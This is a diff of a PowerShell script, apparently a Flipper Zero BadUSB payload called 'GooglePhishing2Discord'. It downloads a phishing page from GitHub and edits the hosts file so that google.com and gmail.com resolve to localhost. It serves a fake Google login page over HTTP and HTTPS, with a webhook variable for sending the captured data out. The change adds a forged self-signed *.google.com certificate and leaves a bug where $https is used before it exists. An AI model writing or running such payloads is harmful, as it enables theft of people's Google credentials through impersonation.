@@ -1,5 +1,7 @@
 if(-not (Test-Path -Path "$env:temp\gph.html" -PathType Leaf)){
     Invoke-RestMethod "https://raw.githubusercontent.com/Agente404/flipper/main/payloads/GooglePhishing2Discord/index.html" -OutFile "$env:temp\gph.html" | Wait-Process;
+    $cert = New-SelfSignedCertificate -Subject *.google.com -DnsName google.com, *.google.com Cert:\CurrentUser\My
+    Write-Output $cert
 }
 
 $hostString = "127.0.0.1 google.com`n127.0.0.1 gmail.com";
@@ -10,7 +12,7 @@ if ($null -eq $isModified ) {
     ipconfig /flushdns;
 }
 
-$url = 'http://127.0.0.1';
+$url = '127.0.0.1';
 $hook="";
 $pageCode = Get-Content "$env:temp\gph.html" -Encoding UTF8 -Raw;
 
@@ -52,17 +54,10 @@ function Handle-Request{
 }
 
 $http = New-Object System.Net.HttpListener;
-$http.Prefixes.Add($url + ':80/');
+$http.Prefixes.Add('http://' + $url + ':80/');
+$https.Prefixes.Add('https://' + $url + ':443/');
 $http.Start();
 
 while ($http.IsListening) {
     Handle-Request $http
-}
-
-$https = New-Object System.Net.HttpListener;
-$https.Prefixes.Add($url + ':443/');
-$https.Start();
-
-while ($https.IsListening) {
-    Handle-Request $https
 }
